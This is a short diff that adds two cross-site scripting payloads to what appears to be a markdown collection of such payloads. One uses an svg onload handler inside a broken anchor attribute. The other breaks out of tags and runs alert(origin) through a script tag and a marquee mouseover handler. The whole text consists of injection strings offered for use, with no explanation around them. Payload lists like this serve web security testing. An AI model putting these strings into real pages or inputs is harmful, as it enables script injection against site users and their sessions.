@@ -9,3 +9,11 @@
 ```
 <?<a href="><svg/onload=alert(1337)>">
 ```
+
+```
+</ <a href="><svg/onload=alert(1)>">
+```
+
+```
+">>>>>><marquee onmouseover='alert(5)'>RXSS</marquee></head><abc></script><script>alert(origin)</script><meta 
+```
